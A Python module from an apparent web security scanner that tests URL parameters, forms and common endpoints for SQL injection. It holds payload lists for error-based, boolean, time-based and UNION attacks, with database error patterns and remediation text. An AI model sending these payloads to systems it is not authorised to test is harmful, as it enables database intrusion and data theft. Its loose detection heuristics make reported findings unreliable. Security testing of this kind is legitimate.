"""
SQL Injection Scanner
OWASP A3:2021 — Injection
CWE-89: Improper Neutralization of Special Elements used in an SQL Command

Tests for:
  - Error-based SQLi (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  - Boolean-based blind SQLi
  - Time-based blind SQLi
  - UNION-based SQLi
  - Second-order / stored SQLi hints
"""

import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .base import BaseScanner, Finding


# ── Error signatures ──────────────────────────────────────────────────────────
DB_ERROR_PATTERNS = {
    "MySQL": [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"unclosed quotation mark after",
        r"mysql_fetch_array",
        r"mysql_num_rows",
        r"supplied argument is not a valid mysql",
        r"com\.mysql\.jdbc",
    ],
    "PostgreSQL": [
        r"pg_query\(\)",
        r"pg_exec\(\)",
        r"postgresql.*error",
        r"unterminated quoted string",
        r"syntax error at or near",
        r"invalid input syntax for type",
    ],
    "MSSQL": [
        r"microsoft ole db provider for sql server",
        r"odbc sql server driver",
        r"microsoft sql native client",
        r"unclosed quotation mark",
        r"\[sql server\]",
        r"mssql_query\(\)",
    ],
    "Oracle": [
        r"ora-\d{5}",
        r"oracle error",
        r"oracle.*driver",
        r"warning.*oci_",
        r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"sqlite_exec",
        r"sqlite error",
        r"sqlite3::",
        r"near \".*\": syntax error",
    ],
    "Generic": [
        r"sql syntax.*mysql",
        r"valid mysql result",
        r"check the manual that corresponds to your",
        r"db2 sql error",
        r"jdbc driver",
        r"sqlstate\[",
        r"pdoexception",
        r"driverinfo",
    ],
}

ERROR_PAYLOADS = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "'; SELECT 1--",
    '" OR "1"="1',
    "1' AND 1=CONVERT(int,@@version)--",
    "1 AND 1=1 UNION SELECT NULL--",
    "' AND extractvalue(1,concat(0x7e,version()))--",   # MySQL error-based
    "' AND 1=CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))--",  # Oracle
    "';WAITFOR DELAY '0:0:0'--",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),   # True / False pair
    (" AND 1=1", " AND 1=2"),
    ("' AND 1=1--", "' AND 1=2--"),
]

TIME_PAYLOADS = [
    # (payload, db, expected_delay_seconds)
    ("' AND SLEEP(5)--", "MySQL", 5),
    ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "MySQL", 5),
    ("'; WAITFOR DELAY '0:0:5'--", "MSSQL", 5),
    ("' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", "PostgreSQL", 5),
    ("' OR SLEEP(5)#", "MySQL", 5),
    ("1; SELECT pg_sleep(5)--", "PostgreSQL", 5),
]

UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 UNION SELECT @@version,NULL--",
    "1 UNION SELECT table_name,NULL FROM information_schema.tables--",
]


def _error_in_response(text: str) -> tuple[bool, str]:
    """Return (found, db_type) if an SQL error signature is found."""
    text_lower = text.lower()
    for db, patterns in DB_ERROR_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, text_lower):
                return True, db
    return False, ""


class SQLiScanner(BaseScanner):
    """Scans for SQL Injection vulnerabilities."""

    SCANNER_NAME = "SQL Injection"
    OWASP_CATEGORY = "A03:2021"
    CWE = "CWE-89"

    def run(self) -> list[Finding]:
        self.logger.info(f"Starting SQLi scan against {self.target}")

        # 1. Test query parameters in the target URL
        params = self.get_query_params(self.target)
        if params:
            for param in params:
                self._test_error_based(self.target, param, "GET")
                self._test_time_based(self.target, param, "GET")
                self._test_boolean_based(self.target, param, "GET")
                self._test_union_based(self.target, param, "GET")

        # 2. Crawl forms and test POST parameters
        forms = self.get_forms(self.target)
        for form in forms:
            self._test_form_sqli(form)

        # 3. Test common endpoints with known-injectable params
        common_endpoints = [
            f"{self.target}/search?q=test",
            f"{self.target}/login",
            f"{self.target}/products?id=1",
            f"{self.target}/user?id=1",
            f"{self.target}/item?item_id=1",
            f"{self.target}/news?article_id=1",
            f"{self.target}/profile?user=admin",
        ]
        for ep in common_endpoints:
            params2 = self.get_query_params(ep)
            for param in params2:
                self._test_error_based(ep, param, "GET")
                self._test_time_based(ep, param, "GET")

        return self.findings

    # ── Error-based ────────────────────────────────────────────────────────────

    def _test_error_based(self, url: str, param: str, method: str = "GET"):
        for payload in ERROR_PAYLOADS:
            test_url = self.inject_param(url, param, payload)
            resp, evidence = self.http.get(test_url)
            if resp is None:
                continue
            found, db_type = _error_in_response(resp.text)
            if found:
                self.add_finding(Finding(
                    title=f"SQL Injection (Error-Based) — {db_type or 'Unknown DB'}",
                    severity="CRITICAL",
                    owasp="A03:2021",
                    cwe="CWE-89",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=url,
                    parameter=param,
                    payload=payload,
                    description=(
                        f"The parameter `{param}` is vulnerable to error-based SQL injection. "
                        f"The database engine ({db_type}) returned a diagnostic error in the HTTP response, "
                        "revealing internal query structure."
                    ),
                    impact=(
                        "Complete database compromise: data exfiltration, authentication bypass, "
                        "potential OS-level command execution (e.g., via xp_cmdshell on MSSQL)."
                    ),
                    remediation=(
                        "Use parameterised queries / prepared statements exclusively. "
                        "Never concatenate user input into SQL strings. "
                        "Apply an ORM or query builder. "
                        "Suppress detailed database error messages in production."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/SQL_Injection",
                        "https://cwe.mitre.org/data/definitions/89.html",
                        "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                    ],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="sqli",
                ))
                return  # one per parameter is sufficient

    # ── Time-based blind ───────────────────────────────────────────────────────

    def _test_time_based(self, url: str, param: str, method: str = "GET"):
        for payload, db, delay in TIME_PAYLOADS:
            test_url = self.inject_param(url, param, payload)
            t0 = time.time()
            resp, evidence = self.http.get(test_url)
            elapsed = time.time() - t0

            if resp is None:
                continue
            if elapsed >= delay * 0.9:  # 90% threshold to account for network jitter
                self.add_finding(Finding(
                    title=f"SQL Injection (Time-Based Blind) — {db}",
                    severity="CRITICAL",
                    owasp="A03:2021",
                    cwe="CWE-89",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=url,
                    parameter=param,
                    payload=payload,
                    description=(
                        f"Parameter `{param}` shows a ~{elapsed:.1f}s delay when injecting "
                        f"`{payload}`, indicating blind time-based SQL injection ({db}). "
                        "No output is reflected but data can be exfiltrated bit-by-bit."
                    ),
                    impact="Full database read/write via blind data extraction techniques (sqlmap, manual).",
                    remediation=(
                        "Use parameterised queries. Apply input validation. "
                        "Implement query timeouts and anomaly detection."
                    ),
                    references=[
                        "https://owasp.org/www-community/attacks/Blind_SQL_Injection",
                        "https://portswigger.net/web-security/sql-injection/blind",
                    ],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="sqli",
                ))
                return

    # ── Boolean-based blind ────────────────────────────────────────────────────

    def _test_boolean_based(self, url: str, param: str, method: str = "GET"):
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            url_true = self.inject_param(url, param, "1" + true_payload)
            url_false = self.inject_param(url, param, "1" + false_payload)

            resp_true, ev_true = self.http.get(url_true)
            resp_false, ev_false = self.http.get(url_false)

            if resp_true is None or resp_false is None:
                continue

            len_diff = abs(len(resp_true.text) - len(resp_false.text))
            status_diff = resp_true.status_code != resp_false.status_code

            if len_diff > 50 or status_diff:
                self.add_finding(Finding(
                    title="SQL Injection (Boolean-Based Blind)",
                    severity="HIGH",
                    owasp="A03:2021",
                    cwe="CWE-89",
                    cvss_score=8.6,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    url=url,
                    parameter=param,
                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    description=(
                        f"Responses differ significantly between true ({true_payload}) and false ({false_payload}) "
                        f"conditions for parameter `{param}` (length delta: {len_diff}, status delta: {status_diff}). "
                        "This indicates boolean-based blind SQL injection."
                    ),
                    impact="Database contents can be extracted character by character.",
                    remediation="Use parameterised queries. Validate and sanitize all user inputs.",
                    references=["https://portswigger.net/web-security/sql-injection/blind"],
                    evidence=ev_true,
                    confirmed=True,
                    vuln_type="sqli",
                ))
                return

    # ── UNION-based ────────────────────────────────────────────────────────────

    def _test_union_based(self, url: str, param: str, method: str = "GET"):
        for payload in UNION_PAYLOADS:
            test_url = self.inject_param(url, param, payload)
            resp, evidence = self.http.get(test_url)
            if resp is None:
                continue
            if re.search(r"\d+\.\d+\.\d+", resp.text) and "union" in payload.lower():
                self.add_finding(Finding(
                    title="SQL Injection (UNION-Based) — Version Disclosure",
                    severity="CRITICAL",
                    owasp="A03:2021",
                    cwe="CWE-89",
                    cvss_score=9.8,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    url=url,
                    parameter=param,
                    payload=payload,
                    description=(
                        f"UNION-based SQL injection detected on parameter `{param}`. "
                        "Database version string visible in response."
                    ),
                    impact="Full database schema and data extraction via UNION queries.",
                    remediation="Use parameterised queries. Disable detailed error output.",
                    references=["https://portswigger.net/web-security/sql-injection/union-attacks"],
                    evidence=evidence,
                    confirmed=True,
                    vuln_type="sqli",
                ))
                return

    # ── Form-based ────────────────────────────────────────────────────────────

    def _test_form_sqli(self, form: dict):
        action = form.get("action", self.target)
        method = form.get("method", "get")
        inputs = form.get("inputs", [])

        for inp in inputs:
            name = inp.get("name", "")
            if not name:
                continue
            for payload in ERROR_PAYLOADS[:5]:
                data = {i.get("name", ""): i.get("value", "test") for i in inputs}
                data[name] = payload

                if method == "post":
                    resp, evidence = self.http.post(action, data=data)
                else:
                    from urllib.parse import urlencode
                    resp, evidence = self.http.get(f"{action}?{urlencode(data)}")

                if resp is None:
                    continue
                found, db_type = _error_in_response(resp.text)
                if found:
                    self.add_finding(Finding(
                        title=f"SQL Injection in Form — Error-Based ({db_type or 'Unknown'})",
                        severity="CRITICAL",
                        owasp="A03:2021",
                        cwe="CWE-89",
                        cvss_score=9.8,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        url=action,
                        parameter=name,
                        payload=payload,
                        description=f"Form field `{name}` at `{action}` is vulnerable to SQL injection.",
                        impact="Authentication bypass, data extraction, potential RCE.",
                        remediation="Use prepared statements. Apply server-side input validation.",
                        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                        evidence=evidence,
                        confirmed=True,
                        vuln_type="sqli",
                    ))
                    return
